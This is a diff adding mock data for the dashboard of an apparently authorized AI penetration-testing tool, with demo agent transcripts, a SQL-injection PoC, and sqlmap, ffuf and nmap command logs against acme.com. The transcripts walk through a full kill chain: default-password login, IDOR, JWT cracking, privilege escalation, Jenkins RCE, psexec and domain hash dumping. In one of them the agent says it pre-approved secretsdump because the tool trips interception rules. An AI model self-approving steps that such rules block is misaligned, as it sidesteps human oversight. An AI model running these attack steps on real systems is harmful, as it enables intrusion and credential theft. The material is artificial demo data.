+      summary: "401\\n401\\n401\\n401\\n401",
+      detail: "No lockout or CAPTCHA after 5 consecutive attempts → no rate limiting, so brute force is possible.",
+    },
+    {
+      seq: 7,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:30Z"),
+      kind: "text",
+      summary:
+        "In short: it's an Element-UI back office with no CAPTCHA or rate limiting. The plan is (1) try the default password list first (admin/admin, admin/admin123, admin/123456), then (2) fall back to the top1000 dictionary if none match. I've already injected \"test back-office default passwords\" into the worker agent as a high-priority intent.",
+    },
+    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it work?" },
+    {
+      seq: 9,
+      worker: "mainagent",
+      ts: T("2026-07-26T03:40:05Z"),
+      kind: "text",
+      summary:
+        'It worked. Logged straight into the console with admin/admin123, recorded it as a high-severity finding, and proved achievement of the "obtain back-office admin access" goal. Shifting focus next to reading user data (goal 2).',
+    },
+  ],
+  2: [
+    {
+      seq: 1,
+      worker: "user",
+      ts: T("2026-07-24T16:00:00Z"),
+      kind: "user",
+      summary: "Can you summarize the authorization-bypass attack surface on api.acme.com?",
+    },
+    {
+      seq: 2,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:00:05Z"),
+      kind: "thinking",
+      summary:
+        "First understand the API's authentication method and the behavior of a few key endpoints, then assess IDOR/JWT risk.",
+    },
+    {
+      seq: 3,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:00:10Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "c21",
+      summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
+    },
+    {
+      seq: 4,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:00:12Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "c21",
+      summary: '{ "id": 42, "role": "user" }',
+      detail: "The regular user token is valid.",
+    },
+    {
+      seq: 5,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:00:30Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "c22",
+      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # check the algorithm",
+    },
+    {
+      seq: 6,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:00:31Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "c22",
+      summary: '{"alg":"HS256","typ":"JWT"}',
+      detail: "This is an HS256 symmetric signature; if the key is weak, it can be forged via offline brute force.",
+    },
+    {
+      seq: 7,
+      worker: "mainagent",
+      ts: T("2026-07-24T16:01:00Z"),
+      kind: "text",
+      summary:
+        "There are two authorization-bypass attack surfaces. (1) /v1/orders?id= uses an auto-incrementing numeric id → a classic IDOR, so try changing the id to read other users' orders. (2) The JWT uses HS256, so brute-forcing the key with john/hashcat → could forge an arbitrary sub to bypass authorization. I've derived one intent for each of these. I recommend doing IDOR first, since it's low-cost and has a direct impact.",
+    },
+  ],
+  3: [
+    {
+      seq: 1,
+      worker: "user",
+      ts: T("2026-07-25T15:45:00Z"),
+      kind: "user",
+      summary: "We've got a shell. How should we attack the internal network next?",
+    },
+    {
+      seq: 2,
+      worker: "mainagent",
+      ts: T("2026-07-25T15:45:05Z"),
+      kind: "thinking",
+      summary:
+        "Lateral movement through the internal network is hard with www-data privileges, so look at local privilege escalation first. After obtaining root, pivot through the DMZ to probe for live hosts.",
+    },
+    {
+      seq: 3,
+      worker: "mainagent",
+      ts: T("2026-07-25T15:45:10Z"),
+      kind: "text",
+      summary:
+        "The first step is privilege escalation. sudo -l shows python3 without a password requirement, so escalate straight to root. Then run a live-host internal network scan (fscan) through the DMZ as a pivot, focusing on the domain controller and CI/CD servers.",
+    },
+    {
+      seq: 4,
+      worker: "user",
+      ts: T("2026-07-25T21:05:00Z"),
+      kind: "user",
+      summary: "3 hosts were found scanning the internal network, and Jenkins 8080 is open — do we have a shot?",
+    },
+    {
+      seq: 5,
+      worker: "mainagent",
+      ts: T("2026-07-25T21:05:08Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "c31",
+      summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
+    },
+    {
+      seq: 6,
+      worker: "mainagent",
+      ts: T("2026-07-25T21:05:12Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "c31",
+      summary: "200",
+      detail: "/script is directly accessible and does not require authentication.",
+    },
+    {
+      seq: 7,
+      worker: "mainagent",
+      ts: T("2026-07-25T21:05:20Z"),
+      kind: "text",
+      summary:
+        "Yes, we have a shot. The Script Console has no authentication, so it goes straight to Groovy RCE. I've injected a hint for the worker to prioritize this host. Once it's compromised, watch the credential store — it may contain domain accounts.",
+    },
+    {
+      seq: 8,
+      worker: "user",
+      ts: T("2026-07-25T23:25:00Z"),
+      kind: "user",
+      summary:
+        "We got a domain account. svc_deploy is in Domain Admins — should we go straight for the domain controller?",
+    },
+    {
+      seq: 9,
+      worker: "mainagent",
+      ts: T("2026-07-25T23:25:10Z"),
+      kind: "text",
+      summary:
+        "That's right. With svc_deploy + Domain Admins, DC01 can be compromised directly via psexec. After that, dumping the entire domain's hashes with secretsdump wraps it up. secretsdump trips the interception rules, so I've pre-approved it.",
+    },
+    {
+      seq: 10,
+      worker: "user",
+      ts: T("2026-07-26T00:22:00Z"),
+      kind: "user",
+      summary: "We've compromised the target. Can you summarize the attack chain?",
+    },
+    {
+      seq: 11,
+      worker: "mainagent",
+      ts: T("2026-07-26T00:22:12Z"),
+      kind: "text",
+      summary:
+        "Here is the full kill chain:\n1. .git leak → white-box source code + hardcoded credentials\n2. shop Fastjson RCE → DMZ reverse shell\n3. sudo privilege escalation → root foothold established\n4. Internal network discovery → DC01/FS01/Jenkins\n5. Jenkins unauthenticated → svc_deploy domain credential dump\n6. Kerberoasting → svc_sql cracked\n7. svc_deploy ∈ Domain Admins → psexec DC01 → secretsdump entire domain hashes\n\nAll four goals have been achieved, and 17 findings were obtained (7 high / 4 medium / 2 low + 8 internal network path steps).",
+    },
+  ],
+};
+
+// ── 资产测试覆盖度（/tasks/{id}/coverage）──
+export const coverage = {
+  enabled: true,
+  scope_rows: 4,
+  denominator: 26,
+  tested: 11,
+  pct: 11 / 26,
+  by_type: [
+    { type: "subdomain", total: 6, tested: 4 },
+    { type: "service", total: 9, tested: 4 },
+    { type: "endpoint", total: 8, tested: 2 },
+    { type: "ip", total: 3, tested: 1 },
+  ],
+};
+
+// ── 资产覆盖图（/tasks/{id}/coverage-graph）──
+export const coverageGraph = {
+  nodes: [
+    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
+    {
+      key: "a:1",
+      kind: "root_domain",
+      label: "acme.com",
+      tested: false,
+      in_scope: false,
+      asset_id: 1,
+      domain: "acme.com",
+      company_id: 1,
+    },
+    {
+      key: "a:2",
+      kind: "subdomain",
+      label: "www.acme.com",
+      tested: true,
+      in_scope: true,
+      asset_id: 2,
+      domain: "www.acme.com",
+      root_domain: "acme.com",
+    },
+    {
+      key: "a:3",
+      kind: "subdomain",
+      label: "api.acme.com",
+      tested: true,
+      in_scope: true,
+      asset_id: 3,
+      domain: "api.acme.com",
+      root_domain: "acme.com",
+    },
+    {
+      key: "a:4",
+      kind: "subdomain",
+      label: "admin.acme.com",
+      tested: false,
+      in_scope: true,
+      asset_id: 4,
+      domain: "admin.acme.com",
+      root_domain: "acme.com",
+    },
+    {
+      key: "a:5",
+      kind: "service",
+      label: "www.acme.com",
+      tested: true,
+      in_scope: true,
+      asset_id: 5,
+      domain: "www.acme.com",
+      url: "https://www.acme.com",
+      port: 443,
+      page_title: "Acme Homepage",
+      status_code: 200,
+    },
+    {
+      key: "a:6",
+      kind: "endpoint",
+      label: "https://www.acme.com/search",
+      tested: true,
+      in_scope: true,
+      asset_id: 6,
+      url: "https://www.acme.com/search?q=",
+      domain: "www.acme.com",
+    },
+    {
+      key: "a:7",
+      kind: "service",
+      label: "api.acme.com",
+      tested: true,
+      in_scope: true,
+      asset_id: 7,
+      domain: "api.acme.com",
+      url: "https://api.acme.com",
+      port: 443,
+      page_title: "API Gateway",
+      status_code: 401,
+    },
+    {
+      key: "a:8",
+      kind: "endpoint",
+      label: "https://api.acme.com/v1/orders",
+      tested: false,
+      in_scope: true,
+      asset_id: 8,
+      url: "https://api.acme.com/v1/orders?id=",
+      domain: "api.acme.com",
+    },
+    {
+      key: "a:9",
+      kind: "service",
+      label: "admin.acme.com",
+      tested: false,
+      in_scope: true,
+      asset_id: 9,
+      domain: "admin.acme.com",
+      url: "https://admin.acme.com",
+      port: 443,
+      page_title: "Back Office Login",
+      status_code: 200,
+    },
+    {
+      key: "a:10",
+      kind: "ip",
+      label: "203.0.113.10",
+      tested: true,
+      in_scope: true,
+      asset_id: 10,
+      ip: "203.0.113.10",
+      company_id: 1,
+    },
+  ],
+  edges: [
+    { src: "a:1", dst: "c:1" },
+    { src: "a:2", dst: "a:1" },
+    { src: "a:3", dst: "a:1" },
+    { src: "a:4", dst: "a:1" },
+    { src: "a:5", dst: "a:2" },
+    { src: "a:6", dst: "a:5" },
+    { src: "a:7", dst: "a:3" },
+    { src: "a:8", dst: "a:7" },
+    { src: "a:9", dst: "a:4" },
+    { src: "a:10", dst: "c:1" },
+  ],
+};
+
+// ── 资产在本任务关联的意图/事实/发现（/tasks/{id}/asset-refs）──
+// 播报板 demo:探索节点 → 其锚定资产。真实后端读 exploration_anchors,mock 里静态给几条。
+const NODE_ASSETS: Record<string, number[]> = {
+  fi1: [3],
+  fi2: [2, 4],
+  fi3: [5],
+  fiRce: [4],
+  fiPriv: [19],
+  fiJenkins: [21],
+  i1: [2],
+  i7: [4],
+};
+
+export function nodeAssetsFor(nodeId: string): FindingAsset[] {
+  return (NODE_ASSETS[nodeId] ?? []).flatMap((id) => {
+    const asset = assets.find((candidate) => candidate.id === id);
+    return asset ? [assetRef(id)] : [];
+  });
+}
+
+export function assetRefsFor(_assetId: number) {
+  return {
+    intents: [
+      { id: 12, kind: "intent", state: "done", summary: "Detecting SQL injection on the www.acme.com search endpoint" },
+      {
+        id: 18,
+        kind: "intent",
+        state: "running",
+        summary: "Enumerating object-level authorization bypass (IDOR) on api.acme.com",
+      },
+    ],
+    facts: [
+      {
+        id: 34,
+        kind: "fact",
+        state: "confirmed",
+        summary: "The search?q= parameter is injectable; MySQL syntax error exposed in the error response",
+      },
+    ],
+    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[High] SQL injection www.acme.com/search?q=" }],
+  };
+}
+
+// ── 工作空间文件管理器（/workspace/*，demo：静态示例树）──
+const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
+  "": [
+    { name: "t-001", dir: true, size: 0 },
+    { name: "transcripts", dir: true, size: 0 },
+    {
+      name: "notes.md",
+      dir: false,
+      size: 96,
+      content:
+        "# Workspace Notes\n\n(Demo) An example file in the workspace root directory that can be edited and saved online.\n",
+    },
+  ],
+  "t-001": [
+    { name: "i12", dir: true, size: 0 },
+    { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
+  ],
+  "t-001/i12": [
+    {
+      name: "exploit.py",
+      dir: false,
+      size: 220,
+      content:
+        "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.acme.com/search?q=\nimport requests\n\nr = requests.get('https://www.acme.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n",
+    },
+    {
+      name: "response.html",
+      dir: false,
+      size: 180,
+      content: "<!-- (Demo) Captured response body fragment -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+    },
+  ],
+  transcripts: [
+    {
+      name: "exp1-worker-i12.jsonl",
+      dir: false,
+      size: 512,
+      content: "(Demo) An example of a raw LLM conversation record, omitted here.",
+    },
+  ],
+};
+
+const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");
+
+export function workspaceList(path: string) {
+  const key = wsClean(path);
+  const items = WS_TREE[key] ?? [];
+  const now = Date.parse("2026-08-09T03:00:00Z");
+  return {
+    path: key,
+    entries: items.map((it, i) => ({
+      name: it.name,
+      path: key ? `${key}/${it.name}` : it.name,
+      dir: it.dir,
+      size: it.size,
+      mtime: now - i * 3_600_000,
+    })),
+  };
+}
+
+export function workspaceRead(path: string) {
+  const key = wsClean(path);
+  const slash = key.lastIndexOf("/");
+  const parent = slash >= 0 ? key.slice(0, slash) : "";
+  const name = slash >= 0 ? key.slice(slash + 1) : key;
+  const f = (WS_TREE[parent] ?? []).find((x) => x.name === name && !x.dir);
+  return { path: key, size: f?.size ?? 0, binary: false, content: f?.content ?? "" };
+}
+
+// ── 工具执行历史（/commands）──
+export const commandRecords = [
+  {
+    id: 1,
+    exploration_id: 1,
+    worker: "worker-1",
+    tool: "bash",
+    command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
+    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… search results page …</html>",
+    is_error: false,
+    created_at: T("2026-08-09T02:10:00Z"),
+  },
+  {
+    id: 2,
+    exploration_id: 1,
+    worker: "worker-1",
+    tool: "bash",
+    command: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs" }),
+    output: "[*] available databases [2]:\n[*] acme_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7",
+    is_error: false,
+    created_at: T("2026-08-09T02:12:30Z"),
+  },
+  {
+    id: 3,
+    exploration_id: 1,
+    worker: "worker-2",
+    tool: "bash",
+    command: JSON.stringify({ command: "ffuf -u https://api.acme.com/FUZZ -w common.txt -mc 200,401,403" }),
+    output: "v1       [Status: 200]\nhealth   [Status: 200]\norders   [Status: 401]\nadmin    [Status: 403]",
+    is_error: false,
+    created_at: T("2026-08-09T02:15:00Z"),
+  },
+  {
+    id: 4,
+    exploration_id: 1,
+    worker: "worker-2",
+    tool: "bash",
+    command: JSON.stringify({ command: "nmap -sV -p- 203.0.113.10" }),
+    output: "PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9\n443/tcp open  https   nginx 1.24",
+    is_error: false,
+    created_at: T("2026-08-09T02:18:00Z"),
+  },
+  {
+    id: 5,
+    exploration_id: 1,
+    worker: "worker-1",
+    tool: "bash",
+    command: JSON.stringify({ command: "curl -s https://admin.acme.com/login --data 'user=admin&pass=admin123'" }),
+    output: "curl: (28) Operation timed out after 10000 ms",
+    is_error: true,
+    created_at: T("2026-08-09T02:20:00Z"),
+  },
+];
+
+// ── LLM 录制（/llm/records、/llm/records/{id}）──
+export const llmRecords = [
+  {
+    id: 1,
+    ts: T("2026-08-09T02:10:02Z"),
+    model: "claude-opus-4-8",
+    profile_name: "Default",
+    session_id: "exp1-worker-i12",
+    task_id: "t-001",
+    worker: "worker-1",
+    latency_ms: 3210,
+    input_tokens: 8421,
+    output_tokens: 512,
+    cache_read: 6000,
+    cache_write: 1200,
+    status: "ok",
+  },
+  {
+    id: 2,
+    ts: T("2026-08-09T02:11:40Z"),
+    model: "claude-opus-4-8",
+    profile_name: "Default",
+    session_id: "exp1-planner",
+    task_id: "t-001",
+    worker: "planner",
+    latency_ms: 4180,
+    input_tokens: 12044,
+    output_tokens: 733,
+    cache_read: 9000,
+    cache_write: 1500,
+    status: "ok",
+  },
+  {
+    id: 3,
+    ts: T("2026-08-09T02:15:20Z"),
+    model: "claude-opus-4-8",
+    profile_name: "Default",
+    session_id: "exp1-worker-i18",
+    task_id: "t-001",
+    worker: "worker-2",
+    latency_ms: 2890,
+    input_tokens: 7311,
+    output_tokens: 421,
+    cache_read: 5200,
+    cache_write: 900,
+    status: "ok",
+  },
+  {
+    id: 4,
+    ts: T("2026-08-09T02:16:05Z"),
+    model: "claude-opus-4-8",
+    profile_name: "Default",
+    session_id: "exp1-worker-i18",
+    task_id: "t-001",
+    worker: "worker-2",
+    latency_ms: 900,
+    input_tokens: 7600,
+    output_tokens: 0,
+    cache_read: 5200,
+    cache_write: 0,
+    status: "error",
+    error: "429 Too Many Requests (retried after backoff)",
+  },
+];
+
+// Distinct tasks with counts, derived from llmRecords above (task picker).
+const llmTaskCounts: Record<string, number> = {};
+for (const r of llmRecords) if (r.task_id) llmTaskCounts[r.task_id] = (llmTaskCounts[r.task_id] ?? 0) + 1;
+export const llmTasks: LLMTask[] = Object.entries(llmTaskCounts).map(([task_id, count]) => ({ task_id, count }));
+
+export function llmRecordDetail(id: number, records = llmRecords) {
+  const item = records.find((r) => r.id === id) ?? records[0];
+  return {
+    ...item,
+    request_body: JSON.stringify(
+      {
+        model: item.model,
+        system: "你是一个授权渗透测试系统的「执行者」…（省略）",
+        messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+        tools: ["bash", "insert_assets", "record_fact", "report_finding"],
+      },
+      null,
+      2,
+    ),
+    response_body: JSON.stringify(
+      {
+        stop_reason: item.status === "error" ? "error" : "tool_use",
+        content: [
+          {
+            type: "text",
+            text: "Perform injection detection on search?q=, verifying first with an error-based payload.",
+          },
+          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
+        ],
+        usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
+      },
+      null,
+      2,
+    ),
+    // HTTP 原文：请求含被归一化视图丢弃的完整工具 schema，响应为原始 SSE 帧。
+    raw_request: JSON.stringify({
+      model: item.model,
+      max_tokens: 8192,
+      stream: true,
+      system: [
+        { type: "text", text: "你是一个授权渗透测试系统的「执行者」…（省略）", cache_control: { type: "ephemeral" } },
+      ],
+      messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+      tools: [
+        {
+          name: "bash",
+          description: "在目标环境中执行一条 shell 命令并返回其输出。",
+          input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
+        },
+      ],
+      thinking: { type: "enabled" },
+    }),
+    raw_response: [
+      `event: message_start`,
+      `data: {"type":"message_start","message":{"id":"msg_01mock","model":"${item.model}","usage":{"input_tokens":${item.input_tokens},"output_tokens":1}}}`,
+      ``,
+      `event: content_block_delta`,
+      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Perform injection detection on search?q=."}}`,
+      ``,
+      `event: content_block_start`,
+      `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
+      ``,
+      `event: content_block_delta`,
+      `data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl -s 'https://www.acme.com/search?q=1%27'\\"}"}}`,
+      ``,
+      `event: message_delta`,
+      `data: {"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":${item.output_tokens}}}`,
+      ``,
+      `event: message_stop`,
+      `data: {"type":"message_stop"}`,
+      ``,
+    ].join("\n"),
+  };
+}
